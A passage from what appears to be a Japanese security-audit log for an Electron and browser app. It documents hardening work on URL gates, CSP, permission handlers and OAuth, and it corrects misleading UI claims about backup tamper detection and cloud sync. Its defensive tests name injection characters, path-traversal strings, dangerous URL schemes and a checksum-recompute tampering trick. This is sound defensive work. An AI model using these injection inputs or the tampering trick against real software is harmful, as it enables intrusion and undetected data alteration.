エラーを集める。デスクトップアプリは Web と違いログが取れないので、最低限の
オプトインテレメトリは入れた方が運用しやすい。

---

## 疑って、外れた調査 (2026-08-22)

同じ疑いを次の人が繰り返さないように、**探して無かったこと**も残す。

### property fuzz の生成器は本当に敵対的な入力を作っているか → 作っていた

不変条件 #4 / #8 / #10 / #11 は property fuzz (400〜700 試行) を回帰テストに
挙げている。fast-check の `fc.string()` は既定で印字可能 ASCII しか作らない
—— CR (0x0d) も LF (0x0a) も NUL も出ない。だから「CR/LF/NUL を拒否する」
性質を `fc.string()` だけで確かめていたら、**拒否の経路は一度も通らない**。

実際に読んだところ、4 つとも `fc.constantFrom(...)` で危険な文字/操作を
**必ず混ぜてから**周りを乱数にしていた:

```ts
fc.constantFrom('\r', '\n', '\r\n', '\0'),           // isSafeHeaderValue
fc.constantFrom('/', '\\', '\0', ' ', '\n', …),        // isSafeSkillName
fc.constantFrom('pull','create','push','copy',…),      // isAllowedEndpoint
```

対照実験でも歯があることを確認した:
- `isSafeHeaderValue` から `\r` を落とす → property.test.ts が落ちる
- `isSafeSkillName` から `..` の判定を落とす → 同上

**結論: この疑いは外れ。** 生成器の作りは正しい。

### ブラウザ版の Vault 暗号に穴はあるか → 無かった

`security/vault.ts` (813 行) はブラウザ版のマスターパスワード暗号で、
このリポジトリで最も高い賭け金の場所。読んで確かめた点:

- PBKDF2-SHA-256 600k / AES-GCM-256 / 鍵は `extractable: false`
- **IV は暗号化のたびに `crypto.getRandomValues`** で作る (nonce 再利用なし)
- リカバリー鍵の導出に版つきのドメイン分離 (`RECOVERY_DERIVATION_PREFIX_V1`)
- **保存された反復回数を鵜呑みにしない** —— `assertKdfIterations` が
  10 万〜400 万の範囲を強制する。IndexedDB を書ける相手が `iterations: 1` に
  下げて総当りを容易にする「ダウングレード」は塞がっている
- パスワードを設定する経路は 3 つ (`initialize` / `recoverWithMnemonic` /
  レガシー移行) で、**最小 12 文字と上限 256 文字が両方の入口にある**。
  `unlock` は最小長を再検査しない (既存の vault を締め出さないため) —— 正しい
- 暗号パラメータは `shared/cryptoParams.ts` に集約済み。以前
  `cloudBackup.ts` が反復回数を文字列 `'PBKDF2-SHA-256-600k'` に焼き込んで
  いた問題も `kdfLabel()` を呼ぶ形に直っている

**結論: この疑いは外れ。** 「同じ判断が 2 か所」も探したが、パスワード方針は
入口ごとに正しく置かれていた。

### BIP-39 リカバリーキーに弱いところはあるか → 無かった

手書きの BIP-39 は乱数源とビット詰めの事故が定番なので読んだ (185 行)。

- 乱数は `crypto.getRandomValues(new Uint8Array(32))` —— CSPRNG で 256 bit 全部
- 24 語 × 11 bit = 264 bit = 256 bit + チェックサム 8 bit。
  BIP-39 の規定 (ENT/32 = 8) と一致
- ワードリストは長さ 2048 をモジュール読込時に表明
- 復号側はチェックサムを**実際に検証**する (`hash[0] !== checksumByte` で throw)。
  最後の語を 1 つずらす検査あり
- 検査は往復だけでなく **Trezor の公式ベクタ**を使っている。テストに
  「往復だけだとワードリストの選び方が間違っていても通る」と理由が
  書いてあり、判断が正しい

### 自動ロックに抜け道はあるか → 無かった

`autoLock.ts` は `onLock()` → `dispose()` の順で呼ぶので、`onLock` が
throw すると後片付けが走らない形に見える。だが実体の `vault.lock()` は

    lock(): void { this.currentKey = null; }

の 1 文で throw しようがない。WebCrypto の鍵は `extractable: false` なので
JS から中身を消すことはできず、参照を捨てるのが正しい上限。

なお `vault.ts` は**残存リスクを明記している** ——「リカバリーは
salt/iv/kcv/master-wrap を上書きするが、**それ以前の IndexedDB スナップショットは
消せない**。復旧前にプロファイルの複製を取られていれば、古いパスワードで
master 鍵を取り出せる」。預けた前提を書く正しいやり方 (0-a-2 参照)。

### `lint:forbidden` の allowFile に死んだ例外はあるか → 無かった

例外を全部無効化して数えたら 23 件で、名指しされている 14 ファイルと
突き合わせても死んだ例外は 0 件だった。ただし**片方向だと将来死ぬ**ので、
双方向の台帳 (`KNOWN_SUPPRESSIONS`) にして固定した。

### 正規表現をユーザー入力から組み立てている場所はあるか → 1 件も無い

`new RegExp(` を `src/` 全体で探して **0 件**。ReDoS も正規表現注入も、
そもそも受け口が存在しない。パターンはすべてリテラルで書かれている。

### `URL.createObjectURL` から blob: 文書を開いている場所はあるか → 無かった

10 箇所すべてが `<a download>` のダウンロード用で、`window.open(blob:)` は
1 つも無い。ライブラリのプレビューは 2026-08 に `data:` + `<img>`
（secure static mode）と `<pre>` のテキスト表示へ移してある
（`library/preview.ts` に経緯あり）。`blob:` 文書は生成元と同一オリジンに
なるので、これは正しい形。

なお `<img>` に渡す data URL は `blobToDataUrl(item.blob)` が **blob 自身の
type** から作るので、保存時のメタ (`item.mime`) が食い違っても属性から
抜けられない（React が属性値をエスケープするうえ、`<img>` は HTML を実行しない）。

### 秘密の比較にタイミング安全でないものはあるか → 認証の判定には無かった

`token|secret|signature|hmac|digest|password|hash` の比較を洗うと、
出てくるのは空文字判定・型判定・URL の userinfo 判定ばかりだった。
`cloudBackup.ts` の `expectedTreeHash !== manifest.treeHash` は
**手元のバックアップの整合検査**で、遠隔の攻撃者が試行を繰り返せる
認証オラクルではない（比較する側が既にファイルを持っている）。

### 型ガードの所属判定にプロトタイプ鎖を辿るものはあるか → 1 件あった（修正済み）

型ガード 38 個を走査し、`in` / 素の添字だけで判定しているものは 1 件。
`isBusinessCategoryId` で、`'constructor'` など 8 個が通っていた。
詳細は該当コミット。`lint:forbidden` の 27 個目として再発を止めた。

境界そのもの（`isServiceId` は Set、`isTemplateId` と main.ts の
`OAUTH_CONFIGS` は `Object.hasOwn`）は元から正しかった。

### 同じビルドの中にも「同じ判断の 2 実装」があった (main↔renderer だけ見ていた)

前項の走査は **main と renderer の間**しか見ていない。同じ側の中に 2 つある形は
拾えず、実際に 1 件あった:

```
                  library/library.ts   fs/fsa.ts
  '.' / '..'       通す                弾く
  '\'              通す                弾く
  '/' NUL CR LF    弾く                弾く
```

危ないのは **この 2 つが同じ入力を並んで受け取っている**こと ——
`web-shim.ts` の `saveToLibrary` は 1 つの `filename` を `library.put()` と
`writeBlobToFolder()` の**両方**へ渡す。今日は実ファイルに触る側 (fsa) が
厳しいので外へは出ないが、**入口が出口より緩い**状態は「新しい書き出し経路が
再検査を忘れた瞬間」に穴になる。

`src/shared/safeFilename.ts` へ厳しい側で統合した (緩める方向へは寄せない ——
`..` や `\` を含む正当なファイル名はこのアプリに無い)。`..foo` / `foo..` /
`...` / `.gitignore` は正当なので通す。3 ファイルとも変異検査 100%。

**走査そのものの穴だった**ので記す: 「同じ判断の 2 実装」を探すなら
ビルドをまたぐ組だけでなく、**同じディレクトリ木の中の同名関数**も見ること。

### 2 つのビルドで「同じ判断」を 2 度書いている関数を全部洗った → 36 件・security は 7 件

`main/` と `renderer/` の**両方で定義されている関数名**を機械で洗うと 36 件。
大半は株価指標 (sma / ema / rsi / macd / backtest …) のような純計算で、
ずれても security にはならない。security に関わるのは 7 件で、**検査が既に
あったのは 3 つだけ**だった:

| 関数 | 何を決めるか | 状態 |
|---|---|---|
| `buildRfc2822` / `isSafeHeaderValue` | メールヘッダの組み立て | 既にあり (`rfc2822Parity`) |
| `parseAtlassianToken` | Atlassian の送り先ホスト | 既にあり (`atlassianSiteParity`) |
| `safeStateEquals` | OAuth の state 比較 | 今セッションで追加 (`stateEqualsParity`) |
| `validateAdvisorJson` (business) | LLM 応答の絞り込み | 今セッションで追加 (`advisorValidationParity`) |
| `isSafeSymbol` | 銘柄記号の形 (URL とマークアップに載る) | **今回追加** |
| `parseSecurityKeys` | HIBP / VirusTotal の資格情報の解析 | **今回追加** |
| `extractJson` | LLM 応答から JSON を取り出す | **今回追加** |
| `validateAdvisorJson` (stocks) | LLM 応答の絞り込み (**3 つ目の写し**) | **今回追加** |

`dualBuildParity.test.ts` に 82 ケース。見るのは「同じ答えを返すか」だけで、
例外の文言は側ごとに違ってよい。**今日は 82 件とも一致した** —— ずれは無い。
対照実験で片側だけずらす (記号の上限 16→32 / 囲みの ```json 必須化) と落ちる。

`vtBase64` は両側とも非公開なので直接は突き合わせられない。実装は
`Buffer.from(s,'utf8').toString('base64')` と `TextEncoder`+`btoa` で、
非 ASCII でも同じバイト列になる形だった (読んで確認)。

### 同名関数の突き合わせ 2 件目 —— `checkEmailBreach` が空白付きメールで「漏洩なし」を返していた（修正済み）

`checkEmailBreach` は 2 か所にある。どちらも **同じ問い**「このメールアドレスは
漏洩に含まれるか」を HIBP に訊く:

| 場所 | 入力の扱い |
|---|---|
| `src/renderer/data/saasWriteWeb.ts` | `input.email.trim()` |
| `src/main/clients/security.ts` | **生のまま** `encodeURIComponent` |

貼り付けで前後に空白が付いた住所を渡すと、デスクトップ版は
`/breachedaccount/%20a%40b.com` を叩く。HIBP は「見つからない」を **404** で
返す実装で、このクライアントは 404 を「どの漏洩にも含まれない」として表示する
—— ずれた側が返すのは **誤った安心** である。

危険側・安全側があるときは厳しい側へ寄せるのが定石だが、ここは「厳しい側」
ではなく**正しい側**が trim するほうだった。main を web に合わせた。

検査: 空白 4 形がすべて `…/breachedaccount/a%40b.com?truncateResponse=false`
を叩くこと + 空白だけの email は問い合わせずに断ること。対照で trim を外すと
5 本落ちる。Stryker: `security.ts` 126 killed / 0 survived / 0 no-cov。

`normalizeAnalysis` (emotions の LLM 応答正規化) も 25 形突き合わせた ——
**ずれ 0**。`dualBuildParity` は 108 形になった。

### 外部 URL を OS へ渡す扉が 2 つあり、**片方しか固定されていなかった**（修正済み）

`shell` へ URL を渡す口は main.ts に 2 つある:

| 扉 | いつ通るか | 判定 |
|---|---|---|
| `ipcMain.handle('app:openExternal')` | レンダラーが `serviceHub.openExternal()` を呼ぶ | `EXTERNAL_URL_SCHEMES`（名前付き定数） |
| `setWindowOpenHandler` | `window.open` / `target="_blank"` / `<form target>` | **手書きの `u.protocol === 'http:' \|\| …`** |

`docs/ARCHITECTURE.md` の不変条件 #5 は `EXTERNAL_URL_SCHEMES` を目印にして
固定されている。**対照実験**で許可表を `new Set(['https:'])` に締めたところ:

- `mainIpc.test.ts` → 落ちた（IPC の扉は定数を見ている）
- `mainWindow.test.ts` → **22 件すべて緑のまま**（窓の扉は手書きなので動かない）

つまり「外部 URL は http(s) 限定」を**締める**変更を入れても、`window.open`
経由の扉は古い規則のまま開き続け、しかも検査は全部緑だった。ARCHITECTURE の
不変条件は、実際には**扉の片方だけ**を語っていた。

検査の表も別々だった。IPC 側だけにあって窓側に無かった形:
`vbscript:` / `chrome://` / `about:` / `ftp:` / 大文字スキーム / `'///'` / `'   '`。

**直し方**: `src/main/externalUrlGate.ts` を新設し、両方の扉がそこを通る
（`shellOpenGate.ts` を main.ts から出したときと同じ理由 —— 危険度の高い関門が
main.ts の中の手書きで、単体で測れない）。表も 1 つにまとめた（通す 7 形 /
弾く 14 形 / 読めない 6 形 / 非文字列 6 形）。

**扉の数も数える**: main.ts の中で「OS へ URL を渡す行」と「関門を呼ぶ行」が
同数でなければ落ちる。3 つ目の扉を足す対照・関門の写経を復活させる対照とも鳴る。

Stryker: `externalUrlGate.ts` 13 killed / 0 survived / 0 no-cov（100.00%）。

なお `web-shim.ts` の `openExternal` は 3 つ目の実装だが、こちらは
`/^https?:\/\//i` の**前置き一致**で、URL 解析より狭い（`https:/example.com`
や前後に空白の付いた形を弾く）。狭い側なので security の穴にはならない。
統合すると広がる方向にしか働かないので**寄せない**（0-a-14）。

### `lint:ipc-handlers` の第 1 不変条件が、**入れた日から 1 つ見逃していた**（修正済み）

規則は `body.indexOf('try {') < body.indexOf('await ')` ——「try が await より
**前に在れば**よい」という位置判定で、`try {…} catch {…}` を**抜けた後**の
await を通していた。`app:openExternal` がまさにその形で、

```
firstTry=124 < firstAwait=253  → 旧規則の判定: 通す (緑)
```

`shell` は OS 側が開けないと reject する（既定ブラウザ未設定、xdg-open が
無い等）。この口の約束は `Promise<void>` でレンダラー側に受け皿が無いので、
reject はそのまま未処理の rejection になっていた。

**位置ではなく包含で見る**ように直した。文字列・テンプレート・コメントを
（長さを保ったまま）潰してから波括弧を数え、`try` ブロックの範囲を実際に求める。
`catch` の無い `try/finally` は reject を止めないので中に在っても通さない。

負の対照を 10 形追加。うち 1 形は**期待値そのものを 0 → 1 に変えた** ——
旧規則の見逃しを「仕様」として self-test に固定していたケース
（`'try の後にもう一度 await (前が try の中なら通す)'`）。

実物 13 ハンドラのうち鳴ったのは `app:openExternal` の 1 件だけ。残り 12 は
本当に守られていた。ハンドラ側は try で囲み、失敗は `console.error` +
`safeErrorMessage` で main の記録に残す（`secrets.ts` と同じ扱い）。

### 25 の自作ゲート全部に「実物を壊して鳴るか」を訊いた → 2 つ穴が出た（両方修正済み）

0-a-15 を全ゲートへ当てた。`--self-test` の陰性対照は**作った本人の想像**なので、
実物のソースを現実的に壊して鳴るかを別に確かめる。`typecheck` と `lint`
(eslint) は自作ゲートではないので対象外。

| ゲート | 壊し方 | 結果 |
|---|---|---|
| `verify:arch` | （このセッション中に実際の doc ドリフトで 2 回鳴った） | ✓ |
| `lint:forbidden` | `nodeIntegration: true` を足す | ✓ |
| `lint:workflow-security` | 第三者 action を SHA 無しで使う | ✓ |
| 〃 | `permissions:` を消す | ✓ |
| 〃 | `pull_request_target` を使う | ✓ |
| 〃 | `run:` に `github.event.pull_request.title` を埋める | ✓ |
| `lint:network-targets` | 送り先を変数から組み立てる | ✓ |
| `lint:url-encoding` | URL path から `encodeURIComponent` を外す | ✓ |
| `lint:imports` | レンダラーで `node:fs` を import | ✓ |
| `lint:docs` | （ゲートを CI に載せ忘れた形で過去に実際に鳴った） | ✓ |
| `lint:citations` | 同じ DOI を 1970 と 1899 の 2 通りで引く | ✓ |
| `lint:doi-prefix` | CUP のラベルに OUP のプレフィックスを付ける | ✓ |
| `lint:charset` | 簡体字を混ぜる | ✓ |
| `lint:knowledge-refs` | 裁定台帳が実在しない id を指す | ✓ |
| `lint:test-coverage` | `index.ts` に直書きの action | **✗ 鳴らなかった**（下記・修正済み） |
| `lint:shell` | `set -euo pipefail` を外す | ✓ |
| `lint:repo-size` | 13MB のファイルを追跡させる（上限 12MB） | ✓ |
| `lint:data-origin` | 宣言を remote↔local で入れ替える | ✓ |
| `lint:credential-use` | 読み手のいないサービスに `fetch` と宣言する | ✓ |
| `lint:ipc-handlers` | try を抜けた後で await | **✗ 鳴らなかった**（別項・修正済み） |
| `lint:mutation-scope` | 変異検査の対象を 1 つ外す | ✓ |
| `lint:collection-time` | 対象を収集時にしか呼ばないテストにする | ✓ |
| `lint:rate-freshness` | 料率年度を 3 年ぶん古くする | ✓ |
| `verify:orchestration` | round が実在しない team を指す | ✓ |
| `vault:check` | 知識の `label` を書き換えて vault と乖離させる | ✓ |
| `verify:graph` | 成果物を 1 行削る（再計算と byte 不一致） | ✓ |
| `verify:knowledge` | 出典を 1 件分すべて消す | ✓ |
| `chain:verify` | （このセッション中に保護対象の実変更で鳴った） | ✓ |

**プローブ自体が的を外していた回が 6 回あった** —— `lint:credential-use` に
ヘッダ名の変更を当てる（そこは見ていない）、`lint:knowledge-refs` に
`knowledge-map.json` を当てる（読むのは裁定台帳）、`verify:graph` に
`serviceId.ts` を当てる、`lint:repo-size` に 400KB を当てる（上限は 12MB）等。
**「鳴らなかった」は、まずプローブの不具合を疑うこと。** ゲートの remit を
読んでから当て直すと 4 件は正しく鳴った。残った 2 件が本物の穴だった。

### `lint:test-coverage` の「action は必ずテストされる」が、**定義場所を仮定していた**（修正済み）

規則は各クライアントの `export const ACTIONS` を読み、その鍵がテストに
クォート付きで出るかを見る。だから **`index.ts` に直接書いた action は
規則の視界に入らない**:

```ts
github: { ...GITHUB_ACTIONS, 'wipe-everything': async () => ({ ok: true }) },
```

`action:invoke` の振り分けは `Object.hasOwn(actions, action)` だけなので、
これはレンダラーから `serviceHub.invoke('github', 'wipe-everything', …)` で
呼べる。**書き込み側の口が、テスト必須の規則の外に生えた**状態で、
`lint:test-coverage` も `typecheck` も緑だった（実測）。

**直し方**: `LIVE_ACTIONS` の各行が `<id>: <IDENT>,` の形であることを要求する。
action の定義場所をクライアントの中だけに閉じ込めれば、既存の
「ACTIONS の鍵はテストに出る」規則が全 action を覆う。

逆向きも足した: **`ACTIONS` を export するクライアントは全部 `LIVE_ACTIONS` に
載る**。今日は 27/27 で一致（両方向とも 0 件）。登録を外しても
今まで鳴っていたのは eslint の未使用 import だけで、import ごと消せば
無音だった。

対照 3 種（直書き / 関数で組み立て / 登録漏れ）とも鳴る。self-test に 8 形追加。

### Electron の security checklist #5 (権限要求) だけ実装していなかった（修正済み）

`setPermissionRequestHandler` / `setPermissionCheckHandler` が **0 件**だった。
**Electron の既定は「権限要求を全部承認」**である —— ハンドラを置かない限り、
マイク・カメラ・位置情報・通知・画面共有は確認なしで開く。

この窓が読むのは同梱した `dist/index.html` だけで、遷移も `will-navigate` で
止めてあるので、今日そこへ辿り着く経路は無い。だがこの層 (L0) の他の項目
—— `contextIsolation` / `sandbox` / `nodeIntegration:false` / CSP /
`setWindowOpenHandler` —— はすべて「万一レンダラーへ任意コードが入ったら」を
前提に置いてある。**同じ前提で、ここだけ既定のままだった。**

許すのはクリップボードの 2 つだけ:

| 権限 | 理由 |
|---|---|
| `clipboard-read` | `LockScreen.tsx` が**復元フレーズを 30 秒後に消す**ため。「まだ自分がコピーした値のままか」を読んでから空にするので、読めないと**消せずに残る** |
| `clipboard-sanitized-write` | 上の消去と、各画面のコピーボタン |

それ以外は全部拒否。実測で `getUserMedia` 0 件・`geolocation` 0 件・
`new Notification` 0 件・`navigator.usb/hid/serial/bluetooth` 0 件。
`SpeechRecognition` は 36 参照あるが**ブラウザ版だけで動くもの**で、
Electron には実装が無い (`isSpeechRecognitionSupported()` が false を返す)。

**2 つの口は同じ判定を通す。** ずれると `navigator.permissions.query()` が
「granted」と答えた権限を実際の要求が拒否する。`externalUrlGate` の扉が
2 つあった話と同じ形なので、判定を 1 つに寄せたうえで
「2 つの口の答えが一致する」を検査で留めた。

対照 5 種すべて鳴る: ハンドラを丸ごと外す (24 本落ちる) / `media` を許可表へ
足す (2 本) / 問い合わせ側だけ true を返す (21 本) / 要求側の callback を
呼ばない (23 本) / `clipboard-read` を落とす (2 本)。

**残る checklist 項目**: `enableEmbeddedAsarIntegrityValidation` /
`onlyLoadAppFromAsar` の fuse は 3-OS の release build が要るのでこの環境では
確かめられない (別項)。

### 同梱される CSP は**緩めても誰も気付かなかった**（修正済み）

対照実験:

| 緩め方 | テスト | ゲート |
|---|---|---|
| `script-src` に `'unsafe-inline'` を足す | 9983 件すべて緑 | 27 本すべて緑 |
| `object-src 'none'` を消す | 同じく全部緑 | 同じく全部緑 |
| `connect-src` を `https:` 全体へ広げる | 同じく全部緑 | 同じく全部緑 |

既にあった `devCsp.test.ts` は「開発サーバの origin が**入っていない**こと」と
「`connect-src` が**在る**こと」しか見ていない。ブラウザ版のほうは
`inlineHtml.test.ts` が sha256 ピン留めを検査していて、そのコメントには
「2026-07 監査: `script-src 'unsafe-inline'` は自分のバンドルだけでなく
**注入されたスクリプトも通す**」と書いてある ——
**同じ危険を、デスクトップ版だけ留めていなかった。**

`src/shared/__tests__/shippedCsp.test.ts` (33 件) を足した:

- 9 ディレクティブを**理由つきで**1 件ずつ等値で留める
- ディレクティブの**数**も留める (知らない口が生えていないか)
- 危ない値を名指しでも落とす (`'unsafe-inline'` / `'unsafe-eval'` /
  `'wasm-unsafe-eval'` / `*` / `https:` / `data:` を、それが危険になる
  ディレクティブごとに) —— 表を書き換えるだけでは緩められない
- ブラウザ版との**違い**も留める (0-a-14)。`script-src` はハッシュ列・
  `connect-src` は https: 全体・`worker-src` はブラウザ版だけ。
  揃える方向は**デスクトップ版を緩める側**にしか働かないので、
  違っていること自体を検査にする
- 両ビルドで**同じであるべき**締め (`object-src` / `frame-src` /
  `base-uri` / `form-action` / `default-src`) は同値で留める

対照 8 種すべて鳴る。うち 1 種は最初「鳴らなかった」が、
**プローブが `index.html` の説明コメント側に当たっていた**だけだった
（メタタグを狙い直すと鳴った）—— ゲート掃引で 6 回踏んだのと同じ罠。

### OAuth の常設ガードが、2 つの宛先のうち片方にしか掛かっていなかった（対称にした）

**これは実バグではない** —— 全 `OAUTH_CONFIGS` の `authorizeUrl` / `tokenUrl` は
ハードコードの https リテラルで、env から来るのは `clientId` / `clientSecret`
だけ。両方の URL を `startsWith('https://')` で留める検査も既に 2 本ある
（`oauth.test.ts:804` と `:2015`）。到達する経路は今日は無い。

**非対称だったのは「常設ガード」のほう。** `assertHttpsTokenUrl` の理由書きは
こう言っている ——「今日は到達しないが、**将来の設定追加やテスト用 fixture の
混入**で平文交換が起きないための常設ガード」。この理由は認可 URL にも
そのまま当てはまるのに、掛かっていたのはトークン端点だけだった。

認可 URL のほうが軽いわけではない:

- `state`（CSRF トークン）と `client_id` を載せて出ていく
- `shell` へ**そのまま渡す** —— `externalUrlGate.ts` の関門を通る 2 つの扉と
  違い、ここは `lint:forbidden` の `allowFile` で例外にしてある**唯一の
  呼び出し口**である。その例外の理由は「URL は我々が組み立てたもの」だが、
  組み立ての材料が https である保証は**検査の中にしか無かった**

**直し方**: `assertHttpsTokenUrl` → `assertHttpsEndpoint(url, role)` に一般化し、
`authorize()` で両方を通す（`role` は文言のためだけで判定は同一 —— 0-a-14 の
「同じ問いなら実装も 1 つ」）。**ブラウザを開く副作用より前**に落とす順序も
検査で留めた。

対照 4 種すべて鳴る: 認可 URL のガードを外す (6 本) / ガードを `openExternal`
の後ろへ動かす (6 本) / 判定を `http` も許す形にする (5 本) / トークン側の
ガードを外す (3 本)。Stryker: `oauth.ts` 385 killed / 0 survived / 0 no-cov。

### 平文バックアップの SHA-256 を「改ざん検知」と**画面に書いていた**（修正済み）

**鍵の無いハッシュを同じファイルの中に置いても、改ざんは検知できない。**
中身を書き換える人は、続けて checksum を計算し直すだけでよい。実測:

```
records を書き換え → checksum を計算し直す → 復元は通る (amount 100 → 999,999)
records を書き換え → checksum はそのまま     → 落ちる (破損検知は効く)
```

この誤った主張は **4 か所**にあった。うち 1 つは**利用者の目に触れる文言**:

| 場所 | 何と書いてあったか |
|---|---|
| `backup.ts:6` | 「破損・改ざんされていれば検知して復元を拒否する」 |
| `backup.ts:128` | 「破損/改ざんを検知する」 |
| `backup.ts:136` (例外の文言) | 「バックアップが破損または**改ざん**されています」 |
| **`BackupPanel.tsx:82`（画面）** | 「**SHA-256 で改ざん検知**、パスワード指定で AES-GCM 暗号化します」 |
| `docs/DATA_PROTECTION.md:28,33,43` | 「破損・改ざんを検知」「SHA-256 完全性と二層で保護」 |

`checksum` の説明は「省略を許すと `alg: none` と同じ形」と**認証の言葉で
考えていた**のに、必須にしたところで得られるのは破損検知だけ、という一歩手前で
止まっていた。

**直し方は「守れる」と書くのをやめること。** 平文バックアップに鍵の置き場は
無いので、鍵付き MAC を足しても意味は増えない（鍵をどこに置いても、
バックアップと一緒に持ち出される）。**改ざんに耐えるのは暗号化バックアップの
ほう**で、AES-GCM の認証タグには「計算し直す」手が無い。文言をそこへ誘導した。

checksum 自体は残す —— 転送中の切り詰め・ビット反転・編集ミスといった
**意図しない壊れ方**は本当に捕まえるので、必須のままにしてある。

**限界を実行できる事実として置いた** (`backup.test.ts` に 9 件)。文言だけ直すと、
次に読んだ人が「せっかく checksum があるのだから」と戻しうる。
検査のひとつは**攻撃が成功することを期待している**。画面の文言も留めた ——
語そのものは禁じられない（正しい文面にも「改ざんに備えるには」と出る）ので、
**打ち消しの一文が在ること**を要求する形にした。

対照 4 種すべて鳴る: 例外の文言に「改ざん」を戻す (1 本) / checksum の照合を
外す (3 本) / checksum 必須を外す (2 本) / **画面の文言を元へ戻す (4 本)**。

なお、この作業中に自分がコメントの「文面」の 2 字目をハングルで打ち間違えたが、
`lint:charset` が捕まえた —— ゲートが実務で鳴った記録として残す。

### 「クラウドへ退避します」と書いてある画面が、1 バイトも送っていなかった（修正済み・重い）

`CloudSyncPanel` は設定画面に**実際に出ている** (`SettingsPage.tsx:801`)。
そこにはこう書いてあった:

> 業務データを暗号化して定期的にクラウド (Drive / Dropbox) へ退避します。
> クラウドには**暗号文のみ**が送られ、鍵は端末のみに保持されます。

そして「今すぐ同期」を押すと `syncNow()` が**状態機械を手で最後まで進め**、

```
最終同期: <いまの時刻>
整合性: OK ✓          ← 緑
```

を表示した。**1 バイトも送っていない。** 送信路が存在しないためである。

**実測（コメントを潰してから走査）:**

| 確かめたこと | 結果 |
|---|---|
| `CloudTransport` の実装 | **0 件**（interface とアダプタの引数だけ） |
| `cloudProviderAdapter` を import する製品コード | **0 件**（参照はコメントの中だけ） |
| `planSync` / `buildUploadEnvelope` を呼ぶ製品コード | **0 件** |
| `cloudSync.ts` / `cloudBackup.ts` / パネルの通信基本語 | **0 件** |

**これは checksum の言い過ぎ (別項) より重い。** あちらは本物の仕組みの性質を
盛っていたが、こちらは**起きていない操作の成功を報告していた**。利用者が失う
のはデータである —— 端末が壊れたときに「クラウドにあるはず」が無い。

**直し方**: 機能を消さず、嘘をやめる。

- 「今すぐ同期」は**無条件で押せない**（`disabled={!enabled}` ではない ——
  トグルを入れた人が押せてしまう）
- `setLastSync(Date.now())` と `verify-complete, ok:true` を消し、
  **偽の成功を出さない**
- バッジは 有効/無効 → **未接続**
- 文言は「まだ接続されていません／データは送信されず、クラウドにバックアップは
  作成されません」を先に置き、「暗号文のみ」は**接続後の設計**として後ろへ回す
- 手動バックアップ（既存・実動）へ案内する

設定（間隔・トグル）と核の状態表示は残した。送信路が入ったらそのまま使える。

**台帳は双方向** (`cloudSyncClaims.test.ts` 8 件):
送信路が**無い**あいだは画面が未接続だと明示すること／送信路が**入ったら**
未接続の文言は残せないこと。対照 5 種すべて鳴る —— 偽の成功を戻す /
`'file-uploaded'` を UI から流す / 未接続の文言を消す / ボタンを押せるようにする /
**`CloudTransport` を実装する（もう一方の向き）**。

既存の `CloudSyncPanel.render.test.ts` がバッジ変更を捕まえた（`無効` を期待して
いた）。検査が働いた記録として残す。

#### ついでに確かめて、正しかった主張

| 画面の主張 | 実測 |
|---|---|
| 「入力したパスワードはこの端末内だけで評価し、外部に送信しません」(`SecurityPage`) | **真**。`passwordStrength.ts` に通信の基本語 0 件・import 0 件、`pwInput` は評価関数と描画にしか渡らない |
| 「データはこの端末のブラウザ内 (IndexedDB) にのみ保存され、どこにも送信されません」(`RealEstatePage` / `MutualFundsPage`) | **真**。記録は自分のページ以外から読まれず、AI 助言の文脈 (`assistantContext.ts`) は静的な知識データしか import しない。書き出しは `<a download>` のローカル保存のみ |
| `backupPosture.ts` が存在しないクラウドを加点していないか | 画面・部品から**参照されていない**ので、誤った姿勢スコアは出ていない |

### 「実体の無い成功」を機械で洗った → 出たのは 1 件だけ（クラウド同期・別項）

クラウド同期の件を一般化して 3 通りに掃いた。**残りは全部シロ**。次の人が
同じ 30 分を使わないよう、掃き方と結果を残す。

**1. 画面の security 主張 87 行のうち、反証しやすいもの（データの所在）**

`送信されません` / `ローカルのみ` / `端末内` などを含む行を抽出して、
実装を辿って確かめた。上の表（パスワード強度・IndexedDB ページ）参照。**全部真。**

**2. 「純粋核 / 実処理は別途」を自称するモジュール 45 件**

`純粋ロジック` / `I/O なし` / `実送信は別途` / `呼出側へ委譲` を冒頭に書いている
モジュールを機械で洗い、UI が**外部作用を示唆しているか**を見た。

| モジュール | 判定 |
|---|---|
| `cloud/cloudProviderAdapter.ts` + `data/cloudBackup.ts` | **クロ**（別項・修正済み） |
| `shared/connectors/connectorHealth.ts` | シロ。監査するのは**登録済みレジストリ**であって生存確認ではなく、doc がそう明言している。`ConnectorsPage` にも「接続 OK」の類の表示は無い |
| 税計算 11 件 / 財務計算 15 件 (`taxGift` / `financialRatios` ほか) | シロ。純粋計算の結果をそのまま描くだけで、外部作用を示唆していない |
| `renderer/plan/internalLicense.ts` | シロ。サーバー課金を介さないローカルライセンスで、doc が「**強固な DRM ではない**・シークレットを共有する範囲が配布範囲」と自分で書いている。`SELF_PRODUCT_ALL_ACCESS = true` なので実質全開放 |

**3. 「成功を表示するのに await も外部作用も無い」ハンドラ**

コンポーネントの関数本体を切り出し、成功表示 (`setMsg` / `setStatus` ほか) が
あるのに `await` も `serviceHub.` も `localStorage` も無いものを列挙 → **5 件**。

| ハンドラ | 判定 |
|---|---|
| `CloudSyncPanel.syncNow` | **クロ**（別項・修正済み） |
| `OverviewPage.applyPreset` / `TemplatesPage.applyPreset` / `resetDefaults` | シロ。**ローカルの表示設定**を変えるだけで、成功表示はその通りの意味 |
| `SettingsPage.redeem` | シロ。ローカル検証のライセンスなので、通信が無いのが正しい |

**この掃き方の要点**: 自称コメントを信用しない。`cloudProviderAdapter` は
「実送信は呼出側が差し込む」と書いてあったが、差し込む側が**存在しなかった**。
判定は必ず**コメントを潰してから**、実際の import と呼び出しで見ること。

### IPC payload が有料 API のパラメータを握っていた（狭めた）

`action:invoke` の payload は**レンダラーから来る任意の JSON**である
（TypeScript の型は実行時に消える —— `maxTokens: number` と書いてあっても、
実際には文字列でもオブジェクトでも届く）。LLM を呼ぶ 4 か所を並べると、
同じ判断の厳しさが **3 段階に割れていた**:

| 場所 | 出どころ | 検査 | 上限 |
|---|---|---|---|
| `assistant.ts` | 定数 `ASSISTANT_MAX_TOKENS` | — (レンダラーは触れない) | 固定 |
| `business.ts` | payload | `typeof number && isFinite && > 0` | **無し** |
| `stocks.ts` | payload | `typeof number && isFinite && > 0` | **無し** |
| `skills.ts` | payload | **無し** (`maxTokens ?? 2048`) | **無し** |

`skills.ts` は文字列でもオブジェクトでも `Infinity` でも素通しだった。
`model` も 3 か所とも payload から取っていて、送り先モデルをレンダラーが
選べた。

**上限を発明せずに済む直し方があった。** 実測すると、**UI はこの 2 つを
